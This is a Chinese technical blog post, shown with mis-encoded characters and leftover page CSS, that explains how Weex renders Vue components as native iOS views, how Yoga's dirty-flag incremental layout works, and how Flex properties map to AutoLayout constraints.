12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä» Vue ç»„ä»¶åº“ï¼ˆVue Libï¼‰åˆ° Weex æ¸²æŸ“ä¸º iOS åŸç”Ÿ UIKit å…ƒç´ ï¼Œæ ¸å¿ƒæ˜¯ â€œVirtual DOM â†’ è·¨çº¿ç¨‹é€šä¿¡ â†’ Native DOM æ„å»º â†’ å¸ƒå±€è®¡ç®— â†’ åŸç”Ÿ View æ¸²æŸ“ â†’ äº‹ä»¶åå‘ç»‘å®šâ€ çš„å®Œæ•´é“¾è·¯ã€‚Weex ä½œä¸ºä¸­é—´å±‚ï¼Œä¸»è¦å®Œæˆ 7 å¤§æ ¸å¿ƒå·¥ä½œï¼Œæ¥ä¸‹å»çœ‹çœ‹è¯¦ç»†å†…å®¹.</p>
<p>Weex ä¾§ APM è¯¥æ€ä¹ˆå¼€å±•ï¼Ÿ</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒæ­¥éª¤</h2>
<p>ä» Vue Lib åˆ° Weex åŸç”Ÿ UIKit å…ƒç´ çš„å®Œæ•´æµç¨‹ã€‚</p>
<p>é¦–å…ˆï¼Œç”¨æˆ·çš„éœ€æ±‚æ˜¯ â€œåˆ—ä¸¾ Weex åšçš„äº‹æƒ…â€ å¹¶ â€œç»“åˆæœ€æ–°æºç æ ‡ä½ç½®â€ï¼Œæ‰€ä»¥æ€è€ƒè¿‡ç¨‹è¦å…ˆæ‹†è§£æµç¨‹ï¼šä» Vue ç¼–è¯‘äº§ç‰©å¤„ç†ã€JS-Native é€šä¿¡ã€Virtual DOM è§£æã€DOM æ„å»ºä¸å¸ƒå±€è®¡ç®—ã€æ¸²æŸ“æŒ‡ä»¤ç”Ÿæˆã€åŸç”Ÿ View åˆ›å»ºä¸æ›´æ–°ï¼Œè¿™å‡ ä¸ªæ ¸å¿ƒæ­¥éª¤ã€‚æ¯ä¸ªæ­¥éª¤éƒ½è¦å¯¹åº” Weex çš„å…·ä½“å·¥ä½œï¼Œè¿˜è¦æ‰¾åˆ°æœ€æ–°æºç ä¸­çš„å¯¹åº”ç±»å’Œæ–¹æ³•ã€‚</p>
<p>ç¬¬ä¸€æ­¥ï¼Œåº”è¯¥æ˜¯ Vue ç¼–è¯‘äº§ç‰©çš„é€‚é…ã€‚å› ä¸º Vue å†™çš„ä»£ç è¦è¢« Weex è¯†åˆ«ï¼ŒWeex éœ€è¦å¤„ç† Vue çš„æ¨¡æ¿ç¼–è¯‘ç»“æœï¼ˆæ¯”å¦‚ render å‡½æ•°ç”Ÿæˆçš„ Virtual DOMï¼‰ï¼Œè¿˜è¦æ³¨å…¥ Weex çš„ JS Runtime APIã€‚è¿™é‡Œè¦æ‰¾æœ€æ–°æºç ä¸­ JS Runtime çš„åˆå§‹åŒ–ç±»ï¼Œæ¯”å¦‚ WXJSContext æˆ– WXBridgeCoreï¼Œå› ä¸º JS ç¯å¢ƒçš„æ­å»ºæ˜¯ç¬¬ä¸€æ­¥ã€‚</p>
<p>ç¬¬äºŒæ­¥ï¼ŒJS-Native é€šä¿¡çš„å»ºç«‹ã€‚Vue çš„ Virtual DOM å˜åŒ–éœ€è¦ä¼ é€’ç»™ Nativeï¼Œæ‰€ä»¥ Weex çš„ Bridge æ ¸å¿ƒè¦æ³¨å†Œé€šä¿¡æ–¹æ³•ï¼ˆæ¯”å¦‚ callNativeï¼‰ï¼Œè¿™é‡Œå¯¹åº” WXBridgeCore çš„ invokeNative æ–¹æ³•ï¼Œä¹‹å‰è®¨è®ºè¿‡ bridge é˜Ÿåˆ—ï¼Œè¿™é‡Œè¦ç»“åˆæœ€æ–°æºç ä¸­é€šä¿¡ä»»åŠ¡çš„è°ƒåº¦ã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼ŒVirtual DOM çš„è§£æä¸ DOM æ ‘æ„å»ºã€‚Weex éœ€è¦æŠŠ Vue çš„ Virtual DOMï¼ˆJSON ç»“æ„ï¼‰è§£ææˆ Native ä¾§çš„ DOM èŠ‚ç‚¹ï¼ˆWXDOMNodeï¼‰ï¼Œè¿™éƒ¨åˆ†ç°åœ¨åœ¨ WXDOMCore ä¸­ï¼Œæ¯”å¦‚ createNode æ–¹æ³•ï¼Œå¤„ç†èŠ‚ç‚¹åˆ›å»ºã€å±æ€§æ›´æ–°ï¼Œè¿˜è¦ç»´æŠ¤ DOM æ ‘ç»“æ„ã€‚</p>
<p>ç¬¬å››æ­¥ï¼Œæ ·å¼è§£æä¸ Yoga å¸ƒå±€è®¡ç®—ã€‚Vue çš„æ ·å¼ï¼ˆæ¯”å¦‚ flexï¼‰è¦è¢« Weex è§£æï¼Œè½¬æ¢ä¸º Yoga çš„å¸ƒå±€å±æ€§ï¼Œç„¶ååœ¨ dom çº¿ç¨‹è®¡ç®—å¸ƒå±€ï¼Œè¿™éƒ¨åˆ†åœ¨ WXDOMCore çš„_scheduleLayout æ–¹æ³•ï¼Œè°ƒç”¨ Yoga çš„ calculateLayoutã€‚</p>
<p>ç¬¬äº”æ­¥ï¼Œæ¸²æŸ“æŒ‡ä»¤ç”Ÿæˆä¸ä¼ é€’ã€‚DOM å’Œå¸ƒå±€è®¡ç®—å®Œæˆåï¼Œè¦æŠŠç»“æœå°è£…æˆæ¸²æŸ“æŒ‡ä»¤ï¼ˆèŠ‚ç‚¹ IDã€frameã€ç±»å‹ç­‰ï¼‰ï¼Œé€šè¿‡ä¸»çº¿ç¨‹ä¼ é€’ç»™æ¸²æŸ“æ ¸å¿ƒï¼Œè¿™é‡Œæ˜¯ WXDOMCore çš„_notifyRender æ–¹æ³•ï¼Œåˆ‡æ¢åˆ° main queueã€‚</p>
<p>ç¬¬å…­æ­¥ï¼ŒåŸç”Ÿ UIKit å…ƒç´ çš„åˆ›å»ºä¸æ›´æ–°ã€‚æ¸²æŸ“æ ¸å¿ƒï¼ˆWXRenderCoreï¼‰æ¥æ”¶æŒ‡ä»¤ï¼Œåˆ›å»ºå¯¹åº” UIKit æ§ä»¶ï¼ˆUILabelã€UIImageView ç­‰ï¼‰ï¼Œæˆ–å¤ç”¨å·²æœ‰ Viewï¼Œæ›´æ–° frame å’Œæ ·å¼ï¼Œè¿™éƒ¨åˆ†åœ¨ WXRenderCore çš„ render æ–¹æ³•ï¼Œè¿˜æœ‰å…·ä½“çš„ View å·¥å‚ç±»ï¼ˆæ¯”å¦‚ WXViewFactoryï¼‰ã€‚</p>
<p>ç¬¬ä¸ƒæ­¥ï¼Œäº‹ä»¶ç»‘å®šä¸åå‘é€šä¿¡ã€‚åŸç”Ÿ UI çš„äº‹ä»¶ï¼ˆæ¯”å¦‚ç‚¹å‡»ï¼‰è¦ä¼ é€’å› Vueï¼ŒWeex éœ€è¦æ³¨å†Œ Native äº‹ä»¶ï¼Œé€šè¿‡ Bridge å›è°ƒ JSï¼Œè¿™é‡Œå¯¹åº” WXEventDispatcher å’Œ WXBridgeCore çš„ callbackJS æ–¹æ³•ã€‚</p>
<p>å…·ä½“çš„é€»è¾‘ä¸åšæ·±å…¥æ¢è®¨ï¼Œå¯ä»¥æŸ¥çœ‹æºç ç ”ç©¶ã€‚</p>
<h2 data-id="heading-1">äºŒã€Yoga</h2>
<h3 data-id="heading-2">1. æ”¯æŒ"å¢é‡å¸ƒå±€æ›´æ–°"</h3>
<p>å½“ç»„ä»¶æ ·å¼å˜åŒ–æ—¶ï¼ŒYoga ä»…é‡æ–°è®¡ç®—å—å½±å“çš„ç»„ä»¶æ ‘åˆ†æ”¯ï¼Œè€Œéå…¨é‡é‡ç®—ï¼Œå¤§å¹…å‡å°‘ RN åº”ç”¨çš„å¸ƒå±€è€—æ—¶å’Œå¡é¡¿ã€Yoga æ˜¯å¦‚ä½•å®ç°ä»…è®¡ç®—å—å½±å“çš„ç»„ä»¶æ ‘åˆ†æ”¯çš„ï¼Ÿç±»ä¼¼æœ‰ä¸ªæ‰“æ ‡è®°ï¼Œæ ‡è®°ä¸º dirtyï¼Ÿ</p>
<p>Yoga å®ç°å¢é‡å¸ƒå±€çš„æ ¸å¿ƒå°±æ˜¯ ã€ŒDirty æ ‡è®°æœºåˆ¶ã€+ã€Œç»„ä»¶æ ‘ä¾èµ–ä¼ æ’­ã€â€”â€” é€šè¿‡æ ‡è®° â€œå—å½±å“çš„èŠ‚ç‚¹â€ï¼Œå¹¶ä»…å¤„ç†è¿™äº›èŠ‚ç‚¹åŠå…¶å…³è”åˆ†æ”¯ï¼Œé¿å…å…¨é‡é‡ç®—ã€‚</p>
<h4 data-id="heading-3">1. YogaNode ä¸ Dirty çŠ¶æ€æ ‡è¯†</h4>
<p>Yoga ä¸­æ¯ä¸ªç»„ä»¶å¯¹åº”ä¸€ä¸ª YogaNodeï¼ˆå¸ƒå±€è®¡ç®—çš„æœ€å°å•å…ƒï¼‰ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½åŒ…å« 3 ä¸ªå…³é”®çŠ¶æ€æ ‡è®°ï¼ˆç”¨äºåˆ¤æ–­æ˜¯å¦éœ€è¦é‡ç®—ï¼‰ï¼š</p>
<ul>
<li>dirtyFlagsï¼ˆæ ¸å¿ƒæ ‡è®°ï¼‰ï¼šè®°å½•èŠ‚ç‚¹çš„ â€œè„çŠ¶æ€ç±»å‹â€ï¼Œä¸»è¦åˆ†ä¸¤ç±»ï¼š
<ul>
<li>LAYOUT_DIRTYï¼šèŠ‚ç‚¹è‡ªèº«æ ·å¼ï¼ˆå¦‚ widthã€flexï¼‰æˆ–å­èŠ‚ç‚¹å¸ƒå±€å˜åŒ–ï¼Œéœ€è¦é‡æ–°è®¡ç®—è‡ªèº«å¸ƒå±€ï¼›</li>
<li>MEASURE_DIRTYï¼šèŠ‚ç‚¹çš„æµ‹é‡ç›¸å…³å±æ€§ï¼ˆå¦‚ measureFunction è‡ªå®šä¹‰æµ‹é‡é€»è¾‘ï¼‰å˜åŒ–ï¼Œéœ€è¦å…ˆé‡æ–°æµ‹é‡å°ºå¯¸ï¼Œå†è®¡ç®—å¸ƒå±€ã€‚</li>
</ul>
</li>
<li>isLayoutCleanï¼šå¸ƒå°”å€¼ï¼Œå¿«é€Ÿåˆ¤æ–­èŠ‚ç‚¹æ˜¯å¦ â€œå¹²å‡€â€ï¼ˆæ— è„çŠ¶æ€ï¼‰ï¼Œé¿å…é‡å¤æ£€æŸ¥ dirtyFlagsï¼›</li>
<li>childCount + children æŒ‡é’ˆï¼šç»´æŠ¤å­èŠ‚ç‚¹åˆ—è¡¨ï¼Œç”¨äºåç»­éå†ä¾èµ–åˆ†æ”¯ã€‚</li>
</ul>
<h4 data-id="heading-4">2. è„çŠ¶æ€è§¦å‘ä¸ä¼ æ’­ï¼šä» â€œå˜åŒ–èŠ‚ç‚¹â€ åˆ° â€œæ ¹èŠ‚ç‚¹â€ çš„å†’æ³¡</h4>
<p>å½“ç»„ä»¶æ ·å¼å˜åŒ–æ—¶ï¼ˆå¦‚ RN ä¸­ä¿®æ”¹ style={{ flex: 2 }}ï¼‰ï¼ŒYoga ä¼šè§¦å‘ä»¥ä¸‹æµç¨‹ï¼š</p>
<ul>
<li>
<p>æ­¥éª¤ 1ï¼šæ ‡è®°è‡ªèº«ä¸º Dirty
ç›´æ¥ä¿®æ”¹å˜åŒ–èŠ‚ç‚¹çš„ dirtyFlags |= LAYOUT_DIRTYï¼ˆæˆ– MEASURE_DIRTYï¼‰ï¼ŒåŒæ—¶è®¾ç½® isLayoutClean = falseã€‚</p>
</li>
<li>
<p>æ­¥éª¤ 2ï¼šå‘ä¸Šå†’æ³¡é€šçŸ¥çˆ¶èŠ‚ç‚¹
ç”±äºçˆ¶èŠ‚ç‚¹çš„å¸ƒå±€ï¼ˆå¦‚å°ºå¯¸ã€ä½ç½®ï¼‰ä¾èµ–å­èŠ‚ç‚¹çš„å¸ƒå±€ç»“æœï¼ˆæ¯”å¦‚çˆ¶èŠ‚ç‚¹æ˜¯ flex:1ï¼Œå­èŠ‚ç‚¹å°ºå¯¸å˜åŒ–ä¼šå½±å“çˆ¶èŠ‚ç‚¹çš„å‰©ä½™ç©ºé—´åˆ†é…ï¼‰ï¼Œå› æ­¤ä¼šé€’å½’å‘ä¸Šéå†çˆ¶èŠ‚ç‚¹ï¼Œç›´åˆ°æ ¹èŠ‚ç‚¹ï¼Œå°†æ‰€æœ‰ â€œä¾èµ–èŠ‚ç‚¹â€ éƒ½æ ‡è®°ä¸º LAYOUT_DIRTYã€‚
å…³é”®ä¼˜åŒ–ï¼šçˆ¶èŠ‚ç‚¹ä»…æ ‡è®° â€œéœ€è¦é‡ç®—â€ï¼Œä½†ä¸ä¼šç«‹å³è®¡ç®—ï¼Œé¿å…ä¸­é€”é‡å¤è§¦å‘è®¡ç®—ã€‚</p>
</li>
<li>
<p>æ­¥éª¤ 3ï¼šè·³è¿‡å·²æ ‡è®°çš„èŠ‚ç‚¹
è‹¥æŸä¸ªèŠ‚ç‚¹å·²è¢«æ ‡è®°ä¸º Dirtyï¼Œåç»­é‡å¤è§¦å‘æ—¶ä¼šç›´æ¥è·³è¿‡ï¼ˆé¿å…é‡å¤å†’æ³¡ï¼‰ï¼Œæå‡æ•ˆç‡ã€‚</p>
</li>
</ul>
<h4 data-id="heading-5">3. å¸ƒå±€è®¡ç®—é˜¶æ®µï¼šåªå¤„ç† Dirty åˆ†æ”¯ï¼Œè·³è¿‡å¹²å‡€èŠ‚ç‚¹ï¼ˆDFSï¼‰</h4>
<p>å½“ Yoga è§¦å‘å¸ƒå±€è®¡ç®—ï¼ˆå¦‚ RN æ¸²æŸ“å¸§è§¦å‘ã€ç»„ä»¶æŒ‚è½½å®Œæˆï¼‰æ—¶ï¼Œä¼šä»æ ¹èŠ‚ç‚¹å¼€å§‹éå†ç»„ä»¶æ ‘ï¼Œä½†ä»…å¤„ç† â€œDirty èŠ‚ç‚¹åŠå…¶å­æ ‘â€ï¼š</p>
<ul>
<li>
<p>æ­¥éª¤ 1ï¼šæ ¹èŠ‚ç‚¹åˆ¤æ–­çŠ¶æ€
è‹¥æ ¹èŠ‚ç‚¹æ˜¯å¹²å‡€çš„ï¼ˆisLayoutClean = trueï¼‰ï¼Œç›´æ¥ç»ˆæ­¢è®¡ç®—ï¼ˆå…¨é‡è·³è¿‡ï¼‰ï¼›è‹¥ä¸º Dirtyï¼Œè¿›å…¥åˆ†æ”¯å¤„ç†ã€‚</p>
</li>
<li>
<p>æ­¥éª¤ 2ï¼šé€’å½’å¤„ç† Dirty åˆ†æ”¯
å¯¹æ¯ä¸ªèŠ‚ç‚¹ï¼Œå…ˆæ£€æŸ¥è‡ªèº«çŠ¶æ€ï¼š</p>
</li>
<li>
<p>è‹¥å¹²å‡€ï¼šç›´æ¥å¤ç”¨ä¸Šæ¬¡ç¼“å­˜çš„å¸ƒå±€ç»“æœï¼ˆx/y/width/heightï¼‰ï¼Œä¸é‡ç®—ï¼›</p>
</li>
<li>
<p>è‹¥ Dirtyï¼š</p>
<ul>
<li>å…ˆå¤„ç†å­èŠ‚ç‚¹ï¼šå¦‚æœå­èŠ‚ç‚¹æ˜¯ Dirtyï¼Œå…ˆé€’å½’è®¡ç®—å­èŠ‚ç‚¹å¸ƒå±€ï¼ˆä¿è¯çˆ¶èŠ‚ç‚¹è®¡ç®—æ—¶ä¾èµ–çš„å­èŠ‚ç‚¹æ•°æ®æ˜¯æœ€æ–°çš„ï¼‰ï¼›</li>
<li>å†è®¡ç®—è‡ªèº«å¸ƒå±€ï¼šæ ¹æ® Flex è§„åˆ™ï¼ˆå¦‚ flexDirectionã€justifyContentï¼‰å’Œå­èŠ‚ç‚¹å¸ƒå±€ç»“æœï¼Œè®¡ç®—è‡ªèº«çš„æœ€ç»ˆå°ºå¯¸å’Œä½ç½®ï¼›</li>
<li>æ¸…é™¤ Dirty æ ‡è®°ï¼šè®¡ç®—å®Œæˆåï¼Œè®¾ç½® dirtyFlags = 0ã€isLayoutClean = trueï¼Œæ ‡è®°ä¸ºå¹²å‡€ã€‚</li>
</ul>
</li>
<li>
<p>æ­¥éª¤ 3ï¼šå¢é‡æ›´æ–°çš„æ ¸å¿ƒæ•ˆæœ
æ¯”å¦‚ä¿®æ”¹ä¸€ä¸ªåˆ—è¡¨é¡¹çš„ marginï¼Œåªä¼šæ ‡è®°è¯¥åˆ—è¡¨é¡¹ â†’ çˆ¶åˆ—è¡¨å®¹å™¨ â†’ æ ¹èŠ‚ç‚¹ä¸º Dirtyï¼Œå…¶ä»–åˆ—è¡¨é¡¹ã€é¡µé¢å…¶ä»–ç»„ä»¶å‡ä¸ºå¹²å‡€ï¼Œä¼šç›´æ¥è·³è¿‡è®¡ç®—ï¼Œä»…é‡ç®— â€œåˆ—è¡¨é¡¹â†’çˆ¶å®¹å™¨â€ è¿™ä¸€å°åˆ†æ”¯ã€‚</p>
</li>
</ul>
<h3 data-id="heading-6">2. Flex å¸ƒå±€é€»è¾‘å¦‚ä½•åˆ° Native ç³»ç»Ÿ</h3>
<p>Flex å¸ƒå±€é€»è¾‘ï¼Œæˆ–è€…è¯´ DSLï¼Œæ˜¯å¦‚ä½•ç¿»è¯‘ä¸º iOS çš„ AutoLayout å’Œ Android çš„ LayoutParams çš„ï¼Ÿ</p>
<p>Yoga å…ˆå°† Flex DSL è§£æä¸ºç»Ÿä¸€çš„ã€Œå¸ƒå±€è®¡ç®—ç»“æœã€ï¼ˆèŠ‚ç‚¹çš„ x/y/width/heightã€é—´è·ã€å¯¹é½æ–¹å¼ç­‰ï¼‰ï¼Œå†æ ¹æ®å¹³å°å·®å¼‚ï¼Œå°†è®¡ç®—ç»“æœ â€œæ˜ å°„â€ ä¸ºå¯¹åº”å¹³å°çš„åŸç”Ÿå¸ƒå±€è§„åˆ™â€”â€”iOS æ˜ å°„ä¸º AutoLayout çº¦æŸï¼ŒAndroid æ˜ å°„ä¸º LayoutParams + åŸç”Ÿå¸ƒå±€å®¹å™¨å±æ€§ã€‚</p>
<h4 data-id="heading-7">1. ç¬¬ä¸€æ­¥ï¼šé€šç”¨å‰ç½®æµç¨‹ï¼ˆè·¨å¹³å°ç»Ÿä¸€ï¼‰</h4>
<p>æ— è®º iOS è¿˜æ˜¯ Androidï¼ŒYoga éƒ½ä¼šå…ˆå®Œæˆä»¥ä¸‹æ­¥éª¤ï¼Œå±è”½ Flex DSL çš„è§£æå·®å¼‚ï¼š</p>
<ol>
<li>è§£æ Flex æ ·å¼ï¼šå°†ä¸Šå±‚æ¡†æ¶çš„ Flex é…ç½®ï¼ˆå¦‚ RN çš„ StyleSheetã€Weex çš„æ¨¡æ¿æ ·å¼ï¼‰è§£æä¸º YogaNode çš„å±æ€§ï¼ˆå¦‚ flexDirectionã€justifyContentã€marginã€padding ç­‰ï¼‰ï¼›</li>
<li>æ‰§è¡Œå¸ƒå±€è®¡ç®—ï¼šé€šè¿‡ Flexbox ç®—æ³•ï¼ˆåŸºäº Web æ ‡å‡†ï¼‰ï¼Œè®¡ç®—å‡ºæ¯ä¸ª YogaNode çš„æœ€ç»ˆå¸ƒå±€æ•°æ®ï¼š</li>
</ol>
<ul>
<li>å›ºå®šå±æ€§ï¼šwidth/heightï¼ˆå« auto/flex è®¡ç®—åçš„å…·ä½“æ•°å€¼ï¼‰ã€x/yï¼ˆç›¸å¯¹çˆ¶èŠ‚ç‚¹çš„åæ ‡ï¼‰ï¼›</li>
<li>é—´è·å±æ€§ï¼šmarginLeft/Top/Right/Bottomã€paddingLeft/Top/Right/Bottomï¼›</li>
<li>å¯¹é½å±æ€§ï¼šalignItemsã€justifyContent å¯¹åº”çš„èŠ‚ç‚¹ç›¸å¯¹ä½ç½®å…³ç³»ï¼›</li>
</ul>
<ol start="3">
<li>è¾“å‡ºæ ‡å‡†åŒ–å¸ƒå±€æ•°æ®ï¼šå°†ä¸Šè¿°ç»“æœå°è£…ä¸ºå¹³å°æ— å…³çš„ç»“æ„ä½“ï¼Œä¾›åç»­å¹³å°æ˜ å°„ä½¿ç”¨ã€‚</li>
</ol>
<h4 data-id="heading-8">2. ç¬¬äºŒæ­¥ï¼šiOS ç«¯ï¼šæ˜ å°„ä¸º AutoLayout çº¦æŸï¼ˆNSLayoutConstraintï¼‰</h4>
<p>AutoLayout çš„æ ¸å¿ƒæ˜¯ã€ŒåŸºäºçº¦æŸçš„å…³ç³»æè¿°ã€ï¼ˆè€Œéç›´æ¥è®¾ç½®åæ ‡ï¼‰ï¼Œå› æ­¤ Yoga ä¼šå°† â€œè®¡ç®—å‡ºçš„å…·ä½“å°ºå¯¸ / ä½ç½®â€ è½¬åŒ–ä¸º UIView çš„çº¦æŸï¼ˆNSLayoutConstraintï¼‰ï¼Œæ ¸å¿ƒæ˜ å°„è§„åˆ™å¦‚ä¸‹ï¼šä¸€ä¸€ç¿»è¯‘ css è§„åˆ™åˆ° iOS AutoLayout å†™æ³•ï¼š</p>





































<table><thead><tr><th>Flex æ ¸å¿ƒå±æ€§</th><th>å¯¹åº”çš„ AutoLayout çº¦æŸé€»è¾‘</th></tr></thead><tbody><tr><td><code>width: 100</code></td><td>æ˜ å°„ä¸º <code>view.widthAnchor.constraint(equalToConstant: 100)</code></td></tr><tr><td><code>height: auto</code></td><td>å…ˆé€šè¿‡ Yoga è®¡ç®—å‡ºå…·ä½“é«˜åº¦ï¼ˆå¦‚æ–‡å­—é«˜åº¦ã€å­èŠ‚ç‚¹åŒ…è£¹é«˜åº¦ï¼‰ï¼Œå†æ˜ å°„ä¸º <code>heightAnchor</code> çº¦æŸï¼›è‹¥ä¸º <code>flex:1</code>ï¼Œåˆ™æ˜ å°„ä¸º <code>heightAnchor.constraint(equalTo: superview.heightAnchor, multiplier: 1)</code>ï¼ˆå æ»¡çˆ¶å®¹å™¨å‰©ä½™é«˜åº¦ï¼‰</td></tr><tr><td><code>marginLeft: 20</code></td><td>æ˜ å°„ä¸º <code>view.leadingAnchor.constraint(equalTo: superview.leadingAnchor, constant: 20)</code></td></tr><tr><td><code>marginTop: 15</code></td><td>æ˜ å°„ä¸º <code>view.topAnchor.constraint(equalTo: superview.topAnchor, constant: 15)</code></td></tr><tr><td><code>justifyContent: center</code>ï¼ˆçˆ¶èŠ‚ç‚¹ flexDirection: rowï¼‰</td><td>çˆ¶èŠ‚ç‚¹çº¦æŸï¼š<code>view.centerXAnchor.constraint(equalTo: superview.centerXAnchor)</code>ï¼›è‹¥æœ‰å¤šä¸ªå­èŠ‚ç‚¹ï¼Œé€šè¿‡è°ƒæ•´å­èŠ‚ç‚¹é—´çš„ <code>spacing</code> çº¦æŸå®ç°å‡åŒ€åˆ†å¸ƒ</td></tr><tr><td><code>alignItems: center</code>ï¼ˆçˆ¶èŠ‚ç‚¹ flexDirection: columnï¼‰</td><td>å­èŠ‚ç‚¹çº¦æŸï¼š<code>view.centerYAnchor.constraint(equalTo: superview.centerYAnchor)</code></td></tr><tr><td><code>flex: 1</code>ï¼ˆå­èŠ‚ç‚¹ï¼‰</td><td>æ˜ å°„ä¸º <code>view.widthAnchor.constraint(equalTo: superview.widthAnchor, multiplier: 1)</code>ï¼ˆæ¨ªå‘å æ»¡ï¼‰+ çˆ¶èŠ‚ç‚¹çš„ <code>distribution</code> çº¦æŸï¼ˆåˆ†é…å‰©ä½™ç©ºé—´ï¼‰</td></tr></tbody></table>
<p>è¡¥å……ä¿¡æ¯ï¼š</p>
<ul>
<li>Yoga ä¼šä¸ºæ¯ä¸ª <code>UIView</code> å…³è”ä¸€ä¸ª <code>YogaNode</code>ï¼Œå¸ƒå±€è®¡ç®—å®Œæˆåï¼Œé€šè¿‡ <code>YogaKit</code>ï¼ˆæˆ–ä¸Šå±‚æ¡†æ¶å¦‚ RN çš„åŸç”Ÿå±‚ï¼‰è‡ªåŠ¨ç”Ÿæˆçº¦æŸï¼›</li>
<li>æ”¯æŒ â€œçº¦æŸä¼˜å…ˆçº§â€ é€‚é…ï¼šæ¯”å¦‚ <code>flex:1</code> å¯¹åº”çš„çº¦æŸä¼˜å…ˆçº§ä¼šé«˜äºå›ºå®šå°ºå¯¸çº¦æŸï¼Œç¡®ä¿ Flex è§„åˆ™ä¼˜å…ˆç”Ÿæ•ˆï¼›</li>
<li>æ··åˆå¸ƒå±€å…¼å®¹ï¼šè‹¥åŸç”Ÿè§†å›¾å·²æœ‰éƒ¨åˆ† AutoLayout çº¦æŸï¼ŒYoga ä¼šç”Ÿæˆ â€œè¡¥å……çº¦æŸâ€ï¼Œé¿å…å†²çªï¼ˆé€šè¿‡ <code>active</code>å±æ€§æ§åˆ¶çº¦æŸå¯ç”¨ / ç¦ç”¨ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-9">ä¸‰ã€Weex å‰–æ</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant V as Vueç»„ä»¶
    participant J as JS Framework
    participant B as JS-Native Bridge
    participant N as Nativeå¼•æ“
    participant P as åŸç”ŸUI

    V-&gt;&gt;J: .vueå•æ–‡ä»¶ (template/style/script)
    Note right of J: ç¼–è¯‘é˜¶æ®µ&lt;br&gt;weex-loaderç¼–è¯‘Vueç»„ä»¶
    J-&gt;&gt;J: ç”ŸæˆVirtual DOMæ ‘
    Note right of J: è¿è¡Œé˜¶æ®µ&lt;br&gt;JS Frameworkç®¡ç†VNodeç”Ÿå‘½å‘¨æœŸ
    J-&gt;&gt;B: é€šè¿‡callNativeå‘é€&lt;br&gt;æ¸²æŸ“æŒ‡ä»¤JSON
    Note right of B: é€šä¿¡å±‚&lt;br&gt;å°†JSè°ƒç”¨è½¬ä¸ºåŸç”Ÿæ¨¡å—è°ƒç”¨
    B-&gt;&gt;N: ä¼ é€’æ¸²æŸ“æŒ‡ä»¤
    Note right of N: åŸç”Ÿæ¸²æŸ“å¼•æ“&lt;br&gt;WXRenderManager (Android)&lt;br&gt;WXComponent (iOS)
    N-&gt;&gt;N: è§£ææŒ‡ä»¤ï¼Œåˆ›å»º/æ›´æ–°ç»„ä»¶æ ‘
    N-&gt;&gt;P: è°ƒç”¨åŸç”ŸAPIæ¸²æŸ“&lt;br&gt;ï¼ˆe.g., UIView, TextViewï¼‰
    P-&gt;&gt;P: æœ€ç»ˆåŸç”Ÿè§†å›¾
</code></pre>
<p>ä¸‹é¢é’ˆå¯¹æ ¸å¿ƒæœºåˆ¶è¯¦è§£ä¸æºç å®šä½</p>
<h3 data-id="heading-10">1. ç¼–è¯‘é˜¶æ®µï¼šä» Vue åˆ° Virtual DOM</h3>
<ul>
<li>å¤„ç† Vue å•æ–‡ä»¶ï¼šå¼€å‘è€…çš„<code>.vue</code>æ–‡ä»¶é€šè¿‡ Webpack å’Œ <code>weex-loader</code> ç¼–è¯‘æˆ JavaScript Bundleã€‚è¿™ä¸ª Bundle åŒ…å«äº†æ¸²æŸ“é¡µé¢æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯</li>
<li>ç”ŸæˆVirtual DOMï¼šåœ¨JSè¿è¡Œæ—¶ï¼ŒVue.jsï¼ˆæˆ– Raxï¼‰çš„æ¸²æŸ“å‡½æ•°ä¼šç”Ÿæˆä¸€æ£µ Virtual DOMæ ‘ï¼ˆVNodeï¼‰ã€‚Weex çš„ JS Framework ä¼šæ‹¦æˆªå¸¸è§„çš„ DOM æ“ä½œï¼Œå°†å…¶å¯¼å‘ Weex çš„æ¸²æŸ“ç®¡é“</li>
</ul>
